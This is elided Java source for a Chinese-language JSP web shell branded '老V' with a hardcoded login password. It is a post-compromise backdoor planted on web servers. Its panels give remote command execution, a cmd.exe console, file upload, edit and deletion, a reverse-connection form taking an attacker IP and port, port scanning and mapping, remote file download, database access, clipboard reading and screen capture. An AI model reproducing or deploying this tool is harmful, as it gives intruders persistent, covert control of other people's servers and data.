...
*/
private static final String PW = "123456aa"; //password
...
"		},"+
"		removedir:function() {"+
"			if (!confirm('警告!你确定要删除 '+this.filename+'?'))return;"+
...
"			var inputs = document.getElementsByTagName('input');"+
"			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"+
"			if (selected.length == 0) {alert('未选择文件');return;}"+
"			var savefilename = prompt('请输入打包后的名称(仅支持Zip格式)','pack.zip');"+
...
"			tmpName += '.zip';"+
"			var path = this.path;"+
"			var name = prompt('输入目标文件名 (仅支持Zip格式)',tmpName);"+
...
"		},"+
"		unpack:function() {"+
"			var path = prompt('解压到 : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"+
"			if (path == null || path.trim().length == 0) return;"+
...
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>老V</title><style type=\"text/css\">"+
...
JSession.setAttribute(MSG,"删除文件成功!");
...
out.println("剪切板是空的,没有任何文本数据!");
}
out.println("</pre>"+
"          <input class=\"bt\" name=\"button\" id=\"button\" onClick=\"history.back()\" value=\"返回\" type=\"button\" size=\"100\"  />"+
"        </p>"+
"      </td>"+
"  </tr>"+
"</table>");
...
"  <tr>"+
"    <td>"+
"        <h2>远程控制 &raquo;</h2><input class=\"bt\" onclick=\"var img = document.getElementById('screen').src='"+SHELL_NAME+"?o=gc&rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"获取屏幕\" type=\"button\" size=\"100\"  />"+
"          <input class=\"bt\" name=\"button\" id=\"button\" onClick=\"a(this)\" value=\"开始\" type=\"button\" size=\"100\"  />设置:  <input type='text' value='3' size='5' id='pl' name='pl'/> 每秒/帧(不要设置太快). 注:无法控制."+
...
" </select>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"连接\" type=\"submit\" size=\"100\"  />"+
"</p>"+
...
"a{font:17px Verdana;BACKGROUND: #FFFFFF;}"+
"	</style><form method=\"POST\" action=\""+SHELL_NAME+"\">"+
"	  <p><span style=\"font:11px Verdana;\">登录密码: </span>"+
"        <input name=\"o\" type=\"hidden\" value=\"login\">"+
"        <input name=\"pw\" type=\"password\" size=\"20\">"+
"        <input type=\"hidden\" name=\"o\" value=\"login\">"+
"        <input type=\"submit\" value=\"登录\"><br/><br/>"+
"	  "+
"<span style=\"font:17px Verdana;\">Copyright &copy; </span><a href=\"http://www.baidu.com\" target=\"_blank\">老V</a></p>"+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
out.println("<h2>文件管理 - 当前磁盘 &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot;</h2>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"  <tr>"+
"    <td nowrap>当前目录  <input type=\"hidden\" name=\"o\" value=\"filelist\"/></td>"+
...
"    <td nowrap><input class=\"bt\" value=\"转到\" type=\"submit\"></td>"+
"  </tr>"+
"</table>"+
"</form>");
...
"<div style=\"float:right;\"><input class=\"input\" name=\"file\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"上传\" type=\"submit\" /></div>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(WEB_ROOT)+"'}).subdir()\">网站根目录</a>"+
" | <a href=\"javascript:new fso({path:'"+Util.convertPath(SHELL_DIR)+"'}).subdir()\">JspShell 目录</a>"+
" | <a href=\"javascript:new fso({}).mkdir()\">新建文件夹</a> | <a href=\"javascript:new fso({}).createFile()\">新建文件</a>"+
" | ");
File[] roots = file.listRoots();
for (int i = 0;i<roots.length;i++) {
File r = roots[i];
out.println("<a href=\"javascript:new fso({path:'"+Util.convertPath(r.getPath())+"'}).subdir();\">磁盘("+Util.convertPath(r.getPath())+")</a>");
if (i != roots.length -1) {
out.println("|");
} 
}
...
"  <td width=\"16%\">修改时间</td>"+
"  <td width=\"10%\">文件大小</td>"+
"  <td width=\"20%\">权限 读/写/执行</td>"+
"  <td width=\"22%\">&nbsp;</td>"+
"</tr>");
if (file.getParent() != null) {
out.println("<tr class=alt1>"+
"<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"+
"<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"+Util.convertPath(file.getAbsolutePath())+"'}).parent()\">返回上一层</a></td>"+
"</tr>");	
}
int dircount = 0;
int filecount = 0;
...
"<td nowrap>--</td>"+
"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / Unkonw </td>"+
"<td nowrap><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">删除</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">剪切</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">打包</a></td>"+
"</tr>");
} else {
filecount++;
...
"<td nowrap>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEdit()\">编辑</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">下载</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).copy()\">复制</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">剪切</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEditProperty()\">修改权限</a>");
if (f.getName().endsWith(".zip")) {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).unpack()\">解压</a>");
} else if (f.getName().endsWith(".rar")) {
out.println(" | <a href=\"javascript:alert('不支持RAR格式,请使用Zip格式.');\">解压</a>");
} else {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">打包</a>");
}
out.println("</td>"+
"</tr>");
}
...
"  <td><a href=\"javascript:new fso({}).packBatch();\">打包选择文件</a> - <a href=\"javascript:new fso({}).deleteBatch();\">删除选择文件</a></td>"+
"  <td colspan=\"4\" align=\"right\">"+dircount+" 文件夹 / "+filecount+" 文件</td></tr>"+
"</table>");
out.println("</div>");
} catch (Exception e) {
e.printStackTrace();
...
JSession.setAttribute(MSG,"上传文件成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
output.close();
input.close();
JSession.setAttribute(MSG,"复制文件成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">&nbsp;&nbsp;<a target=\"_blank\" href=\"http://www.baidu.com/\">老V</a>."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
"<p>当前文件 (输入新文件名)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\"  /></p>"+
"<p>当前文件<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" ></textarea></p>"+
"<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"提交\"> <input class=\"bt\"  type=\"button\" value=\"返回\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {
e.printStackTrace();
...
"<input type='hidden' name='o' value='createFile'>"+
"<p>当前文件 (输入新文件名)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\"  /></p>"+
"<p>当前文件<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" >"+Util.htmlEncode(content.toString())+"</textarea></p>"+
"<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"提交\"> <input class=\"bt\"  type=\"button\" value=\"返回\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
}
...
outs.close();
JSession.setAttribute(MSG,"保存文件成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>设置文件权限/属性 &raquo;</h2>"+
"<p>当前文件 (路径)<br /><input class=\"input\" name=\"file\" id=\"file\" value=\""+request.getParameter("filepath")+"\" type=\"text\" size=\"120\"  /></p>"+
...
"</p>"+
"<p><input class=\"bt\" name=\"submit\" value=\"提交\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\" name=\"submit\" value=\"返回\" id=\"submit\" type=\"button\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {
e.printStackTrace();
...
JSession.setAttribute(MSG,"重置文件属性成功!");
} else {
JSession.setAttribute(MSG,"重置文件属性失败!");
}
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
...
"参数:<br /><input class=\"input\" name=\"program\" id=\"program\" value=\""+program+"\" type=\"text\" size=\"100\"  />"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"开始\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>执行 Shell &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"shell\">"+
"<input type=\"hidden\" name=\"type\" value=\"command\">"+
"参数:<br /><input class=\"input\" name=\"command\" id=\"command\" value=\""+cmd+"\" type=\"text\" size=\"100\"  />"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"开始\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form>"+
"</td>"+
...
JSession.setAttribute(MSG,"程序已经运行成功!");
ins.get("vs").invoke(request,response,JSession);
}
}
} catch (Exception e) {
...
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"下载\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form></table>");
} catch (Exception e) {
e.printStackTrace();
...
f.mkdirs();
JSession.setAttribute(MSG,"创建文件夹成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
JSession.setAttribute(MSG,"移动文件成功!");
} else {
String msg = "移动文件失败!";
if (file.isDirectory()) {
msg += "文件夹不为空,移动失败.";
...
JSession.setAttribute(MSG,"移动文件夹成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" 文件已经存在!");
response.sendRedirect(SHELL_NAME+"?o=index");
return;
}
...
zout.close();
JSession.setAttribute(MSG,"压缩文件成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e;
...
File saveF = new File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" 已经存在该文件!");
response.sendRedirect(SHELL_NAME+"?o=index");
return;
}
...
file.close();
JSession.setAttribute(MSG,"解压文件成功!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
"        <td style=\"width:20%\" align=\"left\">远程 Ip: "+
...
"      <tr align=\"center\">"+
"        <td colspan=\"5\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"端口映射\" id=\"FJE\" class=\"bt\" />"+
"			<input type=\"button\" name=\"giX\" value=\"停止映射\" id=\"giX\" onClick=\"location.href='"+SHELL_NAME+"?o=smp'\" class=\"bt\" />"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
...
JSession.setAttribute("done","停止映射成功!");
...
JSession.setAttribute("done","端口映射成功!");
...
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">反向连接 &gt;&gt;</h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td  align=\"center\">Ip 地址: "+
"          <input name=\"ip\" id=\"ip\" type=\"text\" class=\"input\" size=\"20\" value=\""+ip+"\" />"+
"          端口: "+
"          <input name=\"port\" id=\"port\" type=\"text\" class=\"input\" size=\"20\" value=\""+port+"\" />返回执行程序: "+
"          <input name=\"program\" id=\"program\" type=\"text\" value=\""+program+"\" class=\"input\" size=\"20\" value=\"d\" /></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"2\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"连接\" id=\"FJE\" class=\"bt\" />"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
...
JSession.setAttribute("done","反向连接成功!");
...
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"      <tr>"+
"        <td><h2 id=\"Ninty_H2_Title\">系统信息 &gt;&gt;</h2>"+
"          <div id=\"ghaB\">"+
...
out.println("</ul><h2 id=\"Ninty_H2_Mac\">系统环境 &gt;&gt;</h2><hr style=\" border: 1px solid #ddd;height:0px;\"/><ul id=\"Ninty_Ul_Sys\" class=\"info\">");
...
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"http://www.baidu.com\" target=\"_blank\">By 老V~2013</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
"		<td><a href=\"javascript:doPost({o:'fileList'});\">文件管理</a> | "+
"           <a href=\"javascript:doPost({o:'jspEnv'});\">系统信息</a>| "+		
"			<a href=\"javascript:doPost({o:'vConn'});\">数据库管理</a> | "+
"			<a href=\"javascript:doPost({o:'vs'});\">执行命令</a> | "+
"			<a href=\"javascript:doPost({o:'vso'});\">远程Dos命令</a> | "+
"			<a href=\"javascript:doPost({o:'vbc'});\">反向连接</a> | "+
"			<a href=\"javascript:doPost({o:'vPortScan'});;\">扫描端口</a> | "+
"			<a href=\"javascript:doPost({o:'vd'});\">远程文件下载</a> | "+
"			<a href=\"javascript:;doPost({o:'clipboard'});\">剪切板</a> | "+
"			<a href=\"javascript:doPost({o:'vRemoteControl'});\">远程控制</a> | "+
"			<a href=\"javascript:doPost({o:'vmp'});\">端口映射</a> | "+
"			<a href=\"javascript:doPost({o:'logout'});\">退出</a> "+
"	</tr>"+
"</table>");
if (JSession.getAttribute(MSG) != null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
...
"  <tr>"+
"    <td>");
out.println("<h2>远程Dos命令执行 &raquo;</h2><br/>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" target=\"echo\" onsubmit=\"$('cmd').focus()\">"+
"			<input type=\"submit\" value=\" 执行 \" class=\"bt\">"+
"				<input type=\"text\" name=\"exe\" style=\"width:300px\" class=\"input\" value=\"c:\\windows\\system32\\cmd.exe\"/>"+
"				<input type=\"hidden\" name=\"o\" value=\"online\"/><input type=\"hidden\" name=\"type\" value=\"start\"/><span class=\"tip\">注意 ! 如果你使用IE浏览器 . 首先,你必须输入一个命令,然后你点击 '执行' 按钮,否则你看不到任何响应信息.</span>"+
"			</form>"+
"			<hr/>"+
...
"					<input type=\"button\" value=\"停止\" class=\"bt\" onclick=\"$('ddtype').value='stop';this.form.submit()\">"+
"				</form>"+
